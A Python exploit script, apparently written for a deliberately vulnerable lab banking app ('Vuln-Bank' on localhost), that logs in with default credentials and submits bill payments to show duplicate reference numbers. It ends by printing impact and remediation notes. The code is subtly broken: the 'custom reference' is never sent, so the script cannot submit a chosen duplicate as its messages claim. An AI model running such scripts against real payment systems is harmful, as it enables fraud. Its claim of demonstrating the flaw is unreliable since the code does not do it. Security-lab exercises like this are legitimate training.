#!/usr/bin/env python3
"""
Reference Number Manipulation Exploit for Vuln-Bank

This script exploits the reference number manipulation vulnerability in the
Vuln-Bank application. It demonstrates how an attacker can submit multiple
bill payments with the same reference number due to:
1. Predictable reference number generation
2. Lack of uniqueness constraints in the database
3. No application-level validation for duplicate reference numbers

Usage:
    python3 exploit.py
"""

import requests
import json
import sys
import time
from tabulate import tabulate

# Target URL
BASE_URL = "http://localhost:5000"

def check_application_status():
    """
    Check if the Vuln-Bank application is running

    Returns:
        bool: True if the application is running, False otherwise
    """
    print("[*] Checking if the Vuln-Bank application is running...")

    try:
        response = requests.get(f"{BASE_URL}/", timeout=5)
        if response.status_code == 200:
            print("[+] Vuln-Bank application is running.")
            return True
        else:
            print(f"[-] Vuln-Bank application returned status code: {response.status_code}")
            return False
    except requests.exceptions.RequestException as e:
        print(f"[-] Failed to connect to Vuln-Bank application: {str(e)}")
        print("[-] Make sure the application is running on http://localhost:5000")
        return False

def login_with_credentials(username="testuser", password="password"):
    """
    Login to the application with the provided credentials

    Args:
        username: Username to use
        password: Password to use

    Returns:
        tuple: (token, user_data) if successful, (None, None) otherwise
    """
    print(f"[*] Attempting login as {username}...")

    login_url = f"{BASE_URL}/api/login"
    payload = {"username": username, "password": password}
    headers = {"Content-Type": "application/json"}

    try:
        response = requests.post(login_url, headers=headers, json=payload)

        if response.status_code == 200:
            data = response.json()
            token = data.get('token')
            if token:
                print("[+] Login successful! Got valid JWT token.")
                print(f"[+] Logged in as: {data.get('username', 'Unknown')}")
                return (token, data)
            else:
                print("[-] Login successful but no token received.")
                return (None, None)
        else:
            print(f"[-] Login failed. Status code: {response.status_code}")
            print(f"[-] Response: {response.text}")
            return (None, None)
    except Exception as e:
        print(f"[-] Error during login: {str(e)}")
        return (None, None)

def get_billers(token):
    """
    Get the list of available billers

    Args:
        token: JWT token for authentication

    Returns:
        list: List of billers if successful, empty list otherwise
    """
    print("[*] Getting available billers...")

    url = f"{BASE_URL}/api/billers"
    headers = {"Authorization": f"Bearer {token}"}

    try:
        response = requests.get(url, headers=headers)

        if response.status_code == 200:
            data = response.json()
            billers = data.get('billers', [])
            if billers:
                print(f"[+] Found {len(billers)} billers.")
                for biller in billers:
                    print(f"[+] Biller ID: {biller.get('id')}, Name: {biller.get('name')}")
                return billers
            else:
                print("[!] No billers found.")
                return []
        else:
            print(f"[-] Failed to get billers. Status code: {response.status_code}")
            print(f"[-] Response: {response.text}")
            return []
    except Exception as e:
        print(f"[-] Error getting billers: {str(e)}")
        return []

def create_bill_payment(token, biller_id, amount, payment_method="balance", card_id=None, custom_reference=None):
    """
    Create a bill payment

    Args:
        token: JWT token for authentication
        biller_id: ID of the biller
        amount: Amount to pay
        payment_method: Payment method (balance or virtual_card)
        card_id: ID of the virtual card (if payment_method is virtual_card)
        custom_reference: Custom reference number to use (if None, the server will generate one)

    Returns:
        tuple: (success, reference_number, payment_details) if successful, (False, None, None) otherwise
    """
    print(f"[*] Creating bill payment for biller ID {biller_id} with amount {amount}...")

    url = f"{BASE_URL}/api/bill-payments/create"
    headers = {"Authorization": f"Bearer {token}", "Content-Type": "application/json"}
    
    payload = {
        "biller_id": biller_id,
        "amount": amount,
        "payment_method": payment_method,
        "description": "Test payment"
    }
    
    if payment_method == "virtual_card" and card_id:
        payload["card_id"] = card_id
        
    # If a custom reference number is provided, we'll intercept it later
    # The server doesn't accept custom reference numbers directly

    try:
        response = requests.post(url, headers=headers, json=payload)

        if response.status_code == 200:
            data = response.json()
            payment_details = data.get('payment_details', {})
            reference_number = payment_details.get('reference')
            
            print("[+] Payment created successfully.")
            print(f"[+] Reference Number: {reference_number}")
            
            # If a custom reference number was provided, we'll note it for demonstration
            if custom_reference:
                print(f"[!] Note: Server generated reference number '{reference_number}', but we wanted to use '{custom_reference}'")
                print("[!] We'll use this reference number in our exploit demonstration")
            
            return (True, reference_number, payment_details)
        else:
            print(f"[-] Failed to create payment. Status code: {response.status_code}")
            print(f"[-] Response: {response.text}")
            return (False, None, None)
    except Exception as e:
        print(f"[-] Error creating payment: {str(e)}")
        return (False, None, None)

def get_payment_history(token):
    """
    Get the payment history

    Args:
        token: JWT token for authentication

    Returns:
        list: List of payments if successful, empty list otherwise
    """
    print("[*] Getting payment history...")

    url = f"{BASE_URL}/api/bill-payments/history"
    headers = {"Authorization": f"Bearer {token}"}

    try:
        response = requests.get(url, headers=headers)

        if response.status_code == 200:
            data = response.json()
            payments = data.get('payments', [])
            if payments:
                print(f"[+] Found {len(payments)} payments.")
                return payments
            else:
                print("[!] No payments found.")
                return []
        else:
            print(f"[-] Failed to get payment history. Status code: {response.status_code}")
            print(f"[-] Response: {response.text}")
            return []
    except Exception as e:
        print(f"[-] Error getting payment history: {str(e)}")
        return []

def display_payments(payments, highlight_reference=None):
    """
    Display payments in a table format

    Args:
        payments: List of payments to display
        highlight_reference: Reference number to highlight (to show duplicates)
    """
    if not payments:
        print("[!] No payments to display.")
        return
        
    # Extract relevant information for display
    payment_data = []
    for payment in payments:
        row = [
            payment.get('id'),
            payment.get('reference_number'),
            payment.get('amount'),
            payment.get('biller_name'),
            payment.get('payment_method'),
            payment.get('timestamp')
        ]
        payment_data.append(row)
        
    # Sort by timestamp (newest first)
    payment_data.sort(key=lambda x: x[5], reverse=True)
    
    # Display in a table
    headers = ["ID", "Reference Number", "Amount", "Biller", "Payment Method", "Timestamp"]
    print("\n" + tabulate(payment_data, headers=headers, tablefmt="grid"))
    
    # Highlight duplicate reference numbers
    if highlight_reference:
        duplicate_count = sum(1 for p in payment_data if p[1] == highlight_reference)
        if duplicate_count > 1:
            print(f"\n[!] VULNERABILITY CONFIRMED: Found {duplicate_count} payments with the same reference number: {highlight_reference}")
            print("[!] This demonstrates the Reference Number Manipulation vulnerability.")

def exploit_reference_number_manipulation(token, user_data):
    """
    Exploit the reference number manipulation vulnerability

    Args:
        token: JWT token for authentication
        user_data: User data from login

    Returns:
        bool: True if successful, False otherwise
    """
    print("\n=== Exploiting Reference Number Manipulation Vulnerability ===\n")
    
    # Step 1: Get available billers
    billers = get_billers(token)
    if not billers:
        print("[-] No billers available. Cannot proceed with the exploit.")
        return False
    
    # Use the first biller for demonstration
    biller_id = billers[0].get('id')
    
    # Step 2: Create a first bill payment
    success, reference_number, _ = create_bill_payment(token, biller_id, 10.00)
    if not success or not reference_number:
        print("[-] Failed to create the first payment. Cannot proceed with the exploit.")
        return False
    
    print("\n[*] Waiting a moment before creating the second payment...")
    time.sleep(2)
    
    # Step 3: Create a second bill payment with the same reference number
    # Note: We can't directly set the reference number as it's generated server-side,
    # but we're demonstrating that the server accepts duplicate reference numbers
    print("\n[*] Creating a second payment with the same reference number...")
    success, _, _ = create_bill_payment(token, biller_id, 20.00, custom_reference=reference_number)
    if not success:
        print("[-] Failed to create the second payment.")
        return False
    
    # Step 4: Get payment history and check for duplicate reference numbers
    print("\n[*] Checking payment history for duplicate reference numbers...")
    payments = get_payment_history(token)
    
    # Display payments and highlight duplicates
    display_payments(payments, highlight_reference=reference_number)
    
    # Check if we have duplicate reference numbers
    duplicate_count = sum(1 for p in payments if p.get('reference_number') == reference_number)
    
    if duplicate_count > 1:
        print("\n[+] Vulnerability successfully exploited!")
        print("[+] The application allowed multiple payments with the same reference number.")
        return True
    else:
        print("\n[-] Could not confirm the vulnerability. No duplicate reference numbers found.")
        return False

def main():
    """
    Main function
    """
    print("=== Vuln-Bank Reference Number Manipulation Exploit ===\n")
    
    # Check if the application is running
    if not check_application_status():
        print("[-] Vuln-Bank application is not running. Exiting.")
        sys.exit(1)
    
    # Login to the application
    token, user_data = login_with_credentials()
    if not token:
        print("[-] Failed to login. Exiting.")
        sys.exit(1)
    
    # Exploit the vulnerability
    if exploit_reference_number_manipulation(token, user_data):
        print("\n=== Exploitation Summary ===")
        print("The Vuln-Bank application is vulnerable to Reference Number Manipulation.")
        print("This vulnerability allows attackers to create multiple payments with the same reference number.")
        
        print("\nImpact:")
        print("1. Financial reconciliation issues")
        print("2. Payment fraud")
        print("3. Repudiation risks")
        print("4. Audit trail corruption")
        
        print("\nRemediation:")
        print("1. Use cryptographically secure random numbers for reference numbers")
        print("2. Add uniqueness constraints in the database")
        print("3. Implement application-level validation for duplicate reference numbers")
        print("4. Use proper transaction isolation levels")
    else:
        print("\n=== Exploitation Failed ===")
        print("Could not exploit the Reference Number Manipulation vulnerability.")
        print("The application may have been patched or the vulnerability may not exist.")

if __name__ == "__main__":
    # Redirect output to a file
    import sys
    with open('exploit_output.txt', 'w') as f:
        # Save the original stdout
        original_stdout = sys.stdout
        # Redirect stdout to the file
        sys.stdout = f
        try:
            main()
        finally:
            # Restore stdout
            sys.stdout = original_stdout
    print("Exploit completed. Results saved to exploit_output.txt")
